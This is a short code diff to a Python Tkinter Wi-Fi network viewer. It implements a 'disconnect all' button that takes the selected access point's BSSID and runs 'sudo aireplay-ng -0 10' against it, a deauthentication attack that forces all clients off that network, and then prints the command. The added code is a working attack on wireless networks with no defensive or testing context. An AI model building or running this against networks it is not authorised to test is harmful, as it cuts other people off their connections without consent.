@@ -169,7 +169,18 @@ class WifiNetworksUI(tk.Tk):
         self.after(REFRESH_MS, self.refresh_table)
 
     def disconnectAll_btn (self, _event=None):
-        pass
+        print("disconnectAll started")
+        sel = self.tree.selection()
+        if not sel:
+            return
+
+        values = self.tree.item(sel[0], "values")
+        if len(values) < 2:
+            return
+
+        bssid = values[1]
+        subprocess.run(["sudo", "aireplay-ng", "-0", "10", "-a", bssid, MON_INTERFACE])
+        print("sudo aireplay-ng --deauth 10 -a " + bssid + " " + MON_INTERFACE)
 
     def on_double_click(self, _event=None):
         sel = self.tree.selection()
